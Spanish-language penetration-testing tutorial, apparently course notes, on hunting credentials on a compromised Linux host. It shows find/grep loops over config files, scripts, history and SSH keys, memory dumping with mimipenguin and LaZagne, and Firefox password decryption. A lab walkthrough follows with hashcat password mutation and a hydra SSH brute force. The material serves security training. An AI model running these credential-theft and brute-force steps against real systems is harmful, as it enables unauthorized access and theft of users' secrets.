
# Credential Hunting - Linux

La búsqueda de credenciales es uno de los primeros pasos una vez que tenemos acceso al sistema. Estas credenciales pueden otorgarnos privilegios elevados en cuestión de segundos o minutos. Entre otras cosas, esto es parte del proceso de escalada de privilegios locales que cubriremos aquí. Sin embargo, es importante señalar aquí que estamos lejos de cubrir todas las situaciones posibles y, por lo tanto, nos centramos en los diferentes enfoques.

Podemos imaginar que hemos logrado acceder a un sistema a través de una aplicación web vulnerable y, por lo tanto, hemos obtenido, por ejemplo, un reverse shell. Por lo tanto, para escalar nuestros privilegios de manera más eficiente, podemos buscar contraseñas o incluso credenciales completas que podamos usar para iniciar sesión en nuestro objetivo. Existen varias fuentes que pueden proporcionarnos credenciales que ubicamos en cuatro categorías. Estos incluyen, entre otros:

| **`Archivos`**  | **`Historial`**                | **`Memoria`**            | **`Key-Rings`**                          |
| --------------- | ------------------------------ | ------------------------ | ---------------------------------------- |
| Configuraciones | Registros                      | Cache                    | Credenciales almacenadas en el navegador |
| Bases de datos  | Historial de línea de comandos | Procesamiento en memoria |                                          |
| Notas           |                                |                          |                                          |
| Scripts         |                                |                          |                                          |
| Códigos fuente  |                                |                          |                                          |
| cronjobs        |                                |                          |                                          |
| Claves SSH      |                                |                          |                                          |

Enumerar todas estas categorías nos permitirá aumentar la probabilidad de encontrar con cierta facilidad las credenciales de los usuarios existentes en el sistema. Existen innumerables situaciones diferentes en las que siempre veremos resultados diferentes. Por lo tanto, debemos adaptar nuestro enfoque a las circunstancias del entorno y tener presente el panorama general. Sobre todo, es fundamental tener en cuenta cómo funciona el sistema, su enfoque, para qué existe y qué papel desempeña en la lógica empresarial y la red general. Por ejemplo, supongamos que es un servidor de base de datos aislado. En ese caso, no necesariamente encontraremos allí a usuarios normales, ya que se trata de una interfaz sensible en la gestión de datos a la que sólo se concede acceso a unas pocas personas.

***

## <mark style="color:purple;">Archivos</mark>

Un principio fundamental de Linux es que todo es un archivo. Por ello, es fundamental tener presente este concepto y buscar, encontrar y filtrar los archivos adecuados según nuestros requerimientos. Deberíamos buscar, encontrar e inspeccionar varias categorías de archivos uno por uno. Estas categorías son las siguientes:

|                           |                |            |
| ------------------------- | -------------- | ---------- |
| Archivos de configuración | Bases de datos | Notas      |
| Scripts                   | cronjobs       | Claves SSH |

Los archivos de configuración son el núcleo de la funcionalidad de los servicios en las distribuciones de Linux. A menudo incluso contienen credenciales que podremos leer. Su conocimiento también nos permite comprender con precisión cómo funciona el servicio y sus requisitos. Normalmente, los archivos de configuración están marcados con las siguientes tres extensiones de archivo (`.conf`,`.cnf` y `.config`) . Sin embargo, se puede cambiar el nombre de estos archivos de configuración o los archivos de extensión asociados, lo que significa que estas extensiones de archivo no son necesariamente necesarias. Además, incluso al recompilar un servicio, se puede cambiar el nombre de archivo requerido para la configuración básica, lo que produciría el mismo efecto. Sin embargo, este es un caso raro que no nos encontraremos con frecuencia, pero esta posibilidad no debe quedar fuera de nuestra búsqueda.

La parte más crucial de cualquier enumeración de un sistema es obtener una descripción general del mismo. Por tanto, el primer paso debería ser encontrar todos los archivos de configuración posibles en el sistema, que luego podremos examinar y analizar individualmente con más detalle. Hay muchos métodos para encontrar estos archivos de configuración, y con el siguiente método veremos que hemos reducido nuestra búsqueda a estas tres extensiones de archivo.

### **Archivos de configuración**

```shell-session
cry0l1t3@unixclient:~$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .conf
/run/tmpfiles.d/static-nodes.conf
/run/NetworkManager/resolv.conf
/run/NetworkManager/no-stub-resolv.conf
/run/NetworkManager/conf.d/10-globally-managed-devices.conf
...SNIP...
/etc/ltrace.conf
/etc/rygel.conf
/etc/ld.so.conf.d/x86_64-linux-gnu.conf
/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/etc/fprintd.conf

File extension:  .config
/usr/src/linux-headers-5.13.0-27-generic/.config
/usr/src/linux-headers-5.11.0-27-generic/.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/power/acpi/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/power/acpi/Makefile.config
/home/cry0l1t3/.config
/etc/X11/Xwrapper.config
/etc/manpath.config

File extension:  .cnf
/etc/ssl/openssl.cnf
/etc/alternatives/my.cnf
/etc/mysql/my.cnf
/etc/mysql/debian.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/etc/mysql/mysql.conf.d/mysql.cnf
/etc/mysql/mysql.cnf
/etc/mysql/conf.d/mysqldump.cnf
/etc/mysql/conf.d/mysql.cnf
```

```shell-session
www-data@permx:/$ find / -type f -name "conf*.php" -exec ls -l {} \; 2>/dev/null

-rw-r--r-- 1 www-data www-data 127902 Jan 20  2024 /var/www/chamilo/app/config/configuration.php
-rwxr-xr-x 1 www-data www-data 1258 Aug 31  2023 /var/www/chamilo/plugin/sepe/src/configuration.php
```

Opcionalmente, podemos guardar el resultado en un archivo de texto y usarlo para examinar los archivos individuales uno tras otro. Otra opción es ejecutar el análisis directamente para cada archivo encontrado con la extensión de archivo especificada y generar el contenido. En este ejemplo, buscamos tres palabras ( `user`, `password`, `pass`) en cada archivo con la extensión de archivo `.cnf`.

### **Credenciales en archivos de configuración**

```shell-session
cry0l1t3@unixclient:~$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

File:  /snap/core18/2128/etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /usr/share/ssl-cert/ssleay.cnf

File:  /etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /etc/alternatives/my.cnf

File:  /etc/mysql/my.cnf

File:  /etc/mysql/debian.cnf

File:  /etc/mysql/mysql.conf.d/mysqld.cnf
user		= mysql

File:  /etc/mysql/mysql.conf.d/mysql.cnf

File:  /etc/mysql/mysql.cnf

File:  /etc/mysql/conf.d/mysqldump.cnf

File:  /etc/mysql/conf.d/mysql.cnf
```

También podemos aplicar esta búsqueda simple a otras extensiones de archivo. Además, podemos aplicar este tipo de búsqueda a bases de datos almacenadas en archivos con diferentes extensiones de archivo, y luego podemos leerlas.

### **Bases de datos**

```shell-session
cry0l1t3@unixclient:~$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

DB File extension:  .sql

DB File extension:  .db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db

DB File extension:  .*db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-card-database.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-device-volumes.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-stream-volumes.tdb
/home/cry0l1t3/.cache/tracker/meta.db
/home/cry0l1t3/.cache/tracker/ontologies.gvdb

DB File extension:  .db*
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.dbus
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db-shm
/home/cry0l1t3/.cache/tracker/meta.db-wal
/home/cry0l1t3/.cache/tracker/meta.db
```

Dependiendo del entorno en el que nos encontremos y del propósito del host en el que nos encontremos, a menudo podemos encontrar notas sobre procesos específicos en el sistema. A menudo incluyen listas de muchos puntos de acceso diferentes o incluso sus credenciales. Sin embargo, a menudo resulta complicado encontrar notas inmediatamente si están almacenadas en algún lugar del sistema y no en el escritorio o en sus subcarpetas. Esto se debe a que pueden tener cualquier nombre y no es necesario que tengan una extensión de archivo específica, como `.txt`. Por lo tanto, en este caso, debemos buscar archivos que incluyan la extensión `.txt` del archivo y archivos que no tengan ninguna extensión de archivo.

### **Notas**

```shell-session
cry0l1t3@unixclient:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"

/home/cry0l1t3/.config/caja/desktop-metadata
/home/cry0l1t3/.config/clipit/clipitrc
/home/cry0l1t3/.config/dconf/user
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/pkcs11.txt
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/serviceworker.txt
...SNIP...
```

Los scripts son archivos que a menudo contienen información y procesos muy confidenciales. Estos también contienen, entre otras cosas, las credenciales necesarias para poder llamar y ejecutar los procesos automáticamente. De lo contrario, el administrador o desarrollador tendría que introducir la contraseña correspondiente cada vez que se llame al script o al programa compilado.

### **Scripts**

```shell-session
cry0l1t3@unixclient:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

File extension:  .py

File extension:  .pyc

File extension:  .pl

File extension:  .go

File extension:  .jar

File extension:  .c

File extension:  .sh
/snap/gnome-3-34-1804/72/etc/profile.d/vte-2.91.sh
/snap/gnome-3-34-1804/72/usr/bin/gettext.sh
/snap/core18/2128/etc/init.d/hwclock.sh
/snap/core18/2128/etc/wpa_supplicant/action_wpa.sh
/snap/core18/2128/etc/wpa_supplicant/functions.sh
...SNIP...
/etc/profile.d/xdg_dirs_desktop_session.sh
/etc/profile.d/cedilla-portuguese.sh
/etc/profile.d/im-config_wayland.sh
/etc/profile.d/vte-2.91.sh
/etc/profile.d/bash_completion.sh
/etc/profile.d/apps-bin-path.sh
```

### **Cronjobs**

Los cronjobs son la ejecución independiente de comandos, programas y scripts. Estos se dividen en el área de todo el sistema (`/etc/crontab`) y ejecuciones dependientes del usuario. Algunas aplicaciones y scripts requieren credenciales para ejecutarse y, por lo tanto, se ingresan incorrectamente en los cronjobs.&#x20;

Además, están las zonas que se dividen en diferentes rangos horarios ( `/etc/cron.daily`, `/etc/cron.hourly`, `/etc/cron.monthly`, `/etc/cron.weekly`). Los scripts y archivos utilizados `cron`también se pueden encontrar en `/etc/cron.d/`distribuciones basadas en Debian.

```shell-session
cry0l1t3@unixclient:~$ cat /etc/crontab 

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
```

```shell-session
cry0l1t3@unixclient:~$ ls -la /etc/cron.*/

/etc/cron.d/:
total 28
drwxr-xr-x 1 root root  106  3. Jan 20:27 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all
-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate
-rw-r--r-- 1 root root  607 25. Jan 2021  john
-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm
-rw-r--r-- 1 root root  712 11. Mai 2020  php
-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder
-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat

/etc/cron.daily/:
total 68
drwxr-xr-x 1 root root  252  6. Jan 16:24 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
...SNIP...
```

### **Claves SSH**

Las claves SSH pueden considerarse "tarjetas de acceso" para el protocolo SSH utilizado para el mecanismo de autenticación de clave pública. Se genera un archivo para el cliente ( `Private key`) y uno correspondiente para el servidor (`Public key`). Sin embargo, no son lo mismo, por lo que conocer una `public key` no es suficiente para encontrar una `private key`. Una `public key` puede verificar las firmas generadas por la clave SSH privada y, por lo tanto, permite el inicio de sesión automático en el servidor. Incluso si personas no autorizadas consiguen la clave pública, es casi imposible calcular la clave privada correspondiente a partir de ella. Al conectarse al servidor utilizando la clave SSH privada, el servidor verifica si la clave privada es válida y permite que el cliente inicie sesión en consecuencia. Por lo tanto, ya no se necesitan contraseñas para conectarse vía SSH.

Dado que las claves SSH pueden tener nombres arbitrarios, no podemos buscar nombres específicos en ellas. Sin embargo, su formato nos permite identificarlas de forma única porque, ya sea de clave pública o privada, ambas tienen primeras líneas únicas para distinguirlas.

#### **Claves privadas SSH**

```shell-session
cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

/home/cry0l1t3/.ssh/internal_db:1:-----BEGIN OPENSSH PRIVATE KEY-----
```

#### **Claves públicas SSH**

```shell-session
cry0l1t3@unixclient:~$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

/home/cry0l1t3/.ssh/internal_db.pub:1:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCraK
```

***

## <mark style="color:purple;">Historial</mark>

Todos los archivos históricos proporcionan información crucial sobre el curso actual y pasado/histórico de los procesos. Estamos interesados ​​en los archivos que almacenan el historial de comandos de los usuarios y los registros que almacenan información sobre los procesos del sistema.

En el historial de los comandos introducidos en las distribuciones Linux que utilizan Bash como shell estándar encontramos los archivos asociados en formato `.bash_history`. Sin embargo, otros archivos cómo `.bashrc` o `.bash_profile` pueden contener información importante.

### **Bash History**

```shell-session
cry0l1t3@unixclient:~$ tail -n5 /home/*/.bash*

==> /home/cry0l1t3/.bash_history <==
vim ~/testing.txt
vim ~/testing.txt
chmod 755 /tmp/api.py
su
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK

==> /home/cry0l1t3/.bashrc <==
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

### **Registros**

Un concepto esencial de los sistemas Linux son los archivos de registro que se almacenan en archivos de texto. Muchos programas, especialmente todos los servicios y el propio sistema, escriben este tipo de archivos. En ellos encontramos errores del sistema, detectamos problemas relacionados con los servicios o seguimos lo que hace el sistema en segundo plano. La totalidad de los archivos de registro se pueden dividir en cuatro categorías:

| **Registros de aplicaciones** | **Registros de eventos** | **Registros de servicio** | **Registros del sistema** |
| ----------------------------- | ------------------------ | ------------------------- | ------------------------- |

Existen muchos registros diferentes en el sistema. Estos pueden variar dependiendo de las aplicaciones instaladas, pero estas son algunas de las más importantes:

<table data-header-hidden><thead><tr><th width="235"></th><th></th></tr></thead><tbody><tr><td><strong>Archivo de registro</strong></td><td><strong>Descripción</strong></td></tr><tr><td><code>/var/log/messages</code></td><td>Registros genéricos de actividad del sistema.</td></tr><tr><td><code>/var/log/syslog</code></td><td>Registros genéricos de actividad del sistema.</td></tr><tr><td><code>/var/log/auth.log</code></td><td>(Debian) Todos los registros relacionados con la autenticación.</td></tr><tr><td><code>/var/log/secure</code></td><td>(RedHat/CentOS) Todos los registros relacionados con la autenticación.</td></tr><tr><td><code>/var/log/boot.log</code></td><td>Información de arranque.</td></tr><tr><td><code>/var/log/dmesg</code></td><td>Información y registros relacionados con hardware y controladores.</td></tr><tr><td><code>/var/log/kern.log</code></td><td>Advertencias, errores y registros relacionados con el kernel.</td></tr><tr><td><code>/var/log/faillog</code></td><td>Intentos fallidos de inicio de sesión.</td></tr><tr><td><code>/var/log/cron</code></td><td>Información relacionada con trabajos cron.</td></tr><tr><td><code>/var/log/mail.log</code></td><td>Todos los registros relacionados con el servidor de correo.</td></tr><tr><td><code>/var/log/httpd</code></td><td>Todos los registros relacionados con Apache.</td></tr><tr><td><code>/var/log/mysqld.log</code></td><td>Todos los registros relacionados con el servidor MySQL.</td></tr></tbody></table>

Cubrir el análisis de estos archivos de registro en detalle sería ineficiente en este caso. Entonces, en este punto, debemos familiarizarnos con los registros individuales, primero examinándolos manualmente y entendiendo sus formatos. Sin embargo, aquí hay algunas cadenas que podemos usar para encontrar contenido interesante en los registros:

```shell-session
cry0l1t3@unixclient:~$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

#### Log file:  /var/log/dpkg.log.1
2022-01-10 17:57:41 install libssh-dev:amd64 <none> 0.9.5-1+deb11u1
2022-01-10 17:57:41 status half-installed libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 configure libssh-dev:amd64 0.9.5-1+deb11u1 <none> 
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 status half-configured libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status installed libssh-dev:amd64 0.9.5-1+deb11u1

...SNIP...
```

***

## <mark style="color:purple;">Memoria y caché</mark>

Muchas aplicaciones y procesos funcionan con las credenciales necesarias para la autenticación y las almacenan en la memoria o en archivos para poder reutilizarlas. Por ejemplo, pueden ser las credenciales requeridas por el sistema para los usuarios que iniciaron sesión. Otro ejemplo son las credenciales almacenadas en los navegadores, que también se pueden leer. Para poder recuperar este tipo de información de las distribuciones Linux existe una herramienta llamada [mimipenguin](https://github.com/huntergregal/mimipenguin) que facilita todo el proceso. Sin embargo, esta herramienta requiere permisos de administrador/root.

### **Mimipenguin**

```shell-session
cry0l1t3@unixclient:~$ sudo python3 mimipenguin.py
[sudo] password for cry0l1t3: 

[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY


cry0l1t3@unixclient:~$ sudo bash mimipenguin.sh 
[sudo] password for cry0l1t3: 

MimiPenguin Results:
[SYSTEM - GNOME]          cry0l1t3:WLpAEXFa0SbqOHY
```

Una herramienta aún más poderosa que podemos usar y que se mencionó anteriormente en la sección Búsqueda de credenciales en Windows es `LaZagne`. Esta herramienta nos permite acceder a muchos más recursos y extraer las credenciales. Las contraseñas y hashes que podemos obtener provienen de las siguientes fuentes pero no se limitan a:

|                |                 |           |             |
| -------------- | --------------- | --------- | ----------- |
| Wifi           | Wpa\_supplicant | Libsecret | Kwallet     |
| Chromium-based | CLI             | Mozilla   | Thunderbird |
| Git            | Env\_variable   | Grub      | Fstab       |
| AWS            | Filezilla       | Gftp      | SSH         |
| Apache         | Shadow          | Docker    | KeePass     |
| Mimipy         | Sessions        | Keyrings  |             |

Por ejemplo, los `Keyrings` se utilizan para el almacenamiento seguro y la gestión de contraseñas en distribuciones de Linux. Las contraseñas se almacenan cifradas y protegidas con una contraseña maestra. Es un administrador de contraseñas basado en sistema operativo, que analizaremos más adelante en otra sección. De esta manera, no necesitamos recordar todas las contraseñas y podemos guardar entradas repetidas de contraseñas.

### **LaZagne**

```shell-session
cry0l1t3@unixclient:~$ sudo python2.7 laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: systemd-coredump
Hash: !!:18858::::::

[+] Hash found !!!
Login: sambauser
Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::

[+] Password found !!!
Login: cry0l1t3
Password: WLpAEXFa0SbqOHY

[+] 3 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.50091600418
```

## <mark style="color:purple;">**Navegadores**</mark>

Los navegadores almacenan las contraseñas guardadas por el usuario de forma cifrada localmente en el sistema para su reutilización. Por ejemplo, el navegador `Mozilla Firefox` almacena las credenciales cifradas en una carpeta oculta para el usuario respectivo. Estos suelen incluir los nombres de los campos asociados, las URL y otra información valiosa.

Por ejemplo, cuando almacenamos las credenciales de una página web en el navegador Firefox, se cifran y se almacenan en `logins.json`. Sin embargo, esto no significa que estén seguros allí. Muchos empleados almacenan dichos datos de inicio de sesión en su navegador sin sospechar que pueden ser descifrados fácilmente y utilizados contra la empresa.

### **Credenciales almacenadas de Firefox**

```shell-session
cry0l1t3@unixclient:~$ ls -l .mozilla/firefox/ | grep default 

drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
```

```shell-session
cry0l1t3@unixclient:~$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://www.inlanefreight.com",
      "httpRealm": null,
      "formSubmitURL": "https://www.inlanefreight.com",
      "usernameField": "username",
      "passwordField": "password",
      "encryptedUsername": "MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr",
      "encryptedPassword": "MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=",
      "guid": "{412629aa-4113-4ff9-befe-dd9b4ca388e2}",
      "encType": 1,
      "timeCreated": 1643373110869,
      "timeLastUsed": 1643373110869,
      "timePasswordChanged": 1643373110869,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```

### **Firefox Decrypt**

La herramienta [Firefox Decrypt](https://github.com/unode/firefox_decrypt) es excelente para descifrar estas credenciales y se actualiza periódicamente. Requiere Python 3.9 para ejecutar la última versión. De lo contrario, `Firefox Decrypt 0.7.0` debe utilizar Python 2.

```shell-session
afsh4ck@kali$ python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

2

Website:   https://testing.dev.inlanefreight.com
Username: 'test'
Password: 'test'

Website:   https://www.inlanefreight.com
Username: 'cry0l1t3'
Password: 'FzXUxJemKm6g2lGh'
```

Alternativamente, `LaZagne` también puede devolver resultados si el usuario ha utilizado el navegador compatible.

### **Navegadores - LaZagne**

```shell-session
cry0l1t3@unixclient:~$ python3 laZagne.py browsers

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://testing.dev.inlanefreight.com
Login: test
Password: test

[+] Password found !!!
URL: https://www.inlanefreight.com
Login: cry0l1t3
Password: FzXUxJemKm6g2lGh


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.2310788631439209
```

***

## <mark style="color:purple;">Ejemplo práctico</mark>

Examina el objetivo y descubre la contraseña del usuario Will. Luego, envíe la contraseña como respuesta.

{% hint style="info" %}
A veces, no tendremos ninguna credencial inicial disponible y, como último paso, necesitaremos aplicar fuerza bruta a las credenciales de los servicios disponibles para obtener acceso. Desde otros hosts de la red, nuestros compañeros pudieron identificar al usuario "Kira", que en la mayoría de los casos tenía acceso SSH a otros sistemas con la contraseña "LoveYou1"
{% endhint %}

### Escaneo de puertos

```bash
sudo nmap -v -sV -T5 10.129.202.64               

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Conexión por SSH

Al intentar conectarnos con las credenciales proporcionadas no podemos entrar, por lo que necesitaremos aplicar técnicas de mutación de contraseñas.

<figure><img src="/files/vlOgK04EMf4zbhdZNZWZ" alt=""><figcaption></figcaption></figure>

### Password Mutation

Vamos a mutar el password `LoveYou1` con el objetivo de acceder por SSH. Para ello vamos a usar hashcat de la siguiente manera:

```bash
echo 'LoveYou1' > love.txt
```

```bash
hashcat --force love.txt -r custom.rule --stdout | sort -u > mut_love.txt
```

```bash
cat mut_love.txt 

L0vey0u1
L0vey0u1!
L0veY0u1
L0veY0u1!
L0vey0u101
L0vey0u101!
L0veY0u101!
L0vey0u102
L0vey0u102!
L0veY0u102!
L0vey0u103
L0vey0u103!
L0veY0u103!
L0vey0u104
L0vey0u104!
...
```

### Brute Force

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ hydra -l kira -P mut_love.txt ssh://10.129.202.64 -t 48 -I 
</strong>Hydra v9.5 (c) 2023 by van Hauser/THC &#x26; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-01 15:06:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 48 tasks per 1 server, overall 48 tasks, 459 login tries (l:1/p:459), ~10 tries per task
[DATA] attacking ssh://10.129.202.64:22/
[STATUS] 335.00 tries/min, 335 tries in 00:01h, 141 to do in 00:01h, 31 active
[22][ssh] host: 10.129.202.64   login: kira   password: L0vey0u1!
1 of 1 target successfully completed, 1 valid password found
</code></pre>

Nos encuentra la contraseña correcta: `L0vey0u1!`. Probamos a conectarnos por SSH y conseguimos acceder sin problema:

<figure><img src="/files/uxuxAxeGrkOEM4fSPKG2" alt=""><figcaption></figcaption></figure>

### Enumeración

Encontramos una herramienta interesante en el `.bash_history`: `firefox_decrypt.git.` Está eliminada por lo que vamos a descargarla en nuestro Kali y enviarla para ejecutarla en el servidor.

```bash
kira@nix01:~$ pwd
/home/kira

kira@nix01:~$ la
.bash_history  .cache   Documents  .local    Pictures  .ssh       .viminfo
.bash_logout   .config  Downloads  .mozilla  .profile  Templates
.bashrc        Desktop  .gnupg     Music     Public    Videos

kira@nix01:~$ cat .bash_history 
cd
git clone https://github.com/unode/firefox_decrypt.git  #<--- Herramienta interesante
cd firefox_decrypt/
ls
./firefox_decrypt.py 
su
./firefox_decrypt.py 
python3.9 firefox_decrypt.py 
cd ..
rm -rf firefox_decrypt/
vim .bash_history 
su
firefox 
su
firefox 
cd .mozilla/firefox/
ls
cd ytb95ytb.default-release/  #<---- Usa este perfil
ls
cat logins.json 
vim logins.json 
```

* Descargamos la herramienta: <https://github.com/unode/firefox_decrypt>

Vamos a la ruta `/home/kira/.mozilla/firefox`, enviamos el script y lo ejecutamos de la siguiente manera:

```shell-session
kira@nix01:~/.mozilla/firefox$ python3.9 firefox_decrypt.py 
Select the Mozilla profile you wish to decrypt
1 -> lktd9y8y.default
2 -> ytb95ytb.default-release
2

Website:   https://dev.inlanefreight.com
Username: 'will@inlanefreight.htb'
Password: 'TUqr7QfLTLhruhVbCP'
```

Y finalmente obtenemos el password del usuario Will: `TUqr7QfLTLhruhVbCP`
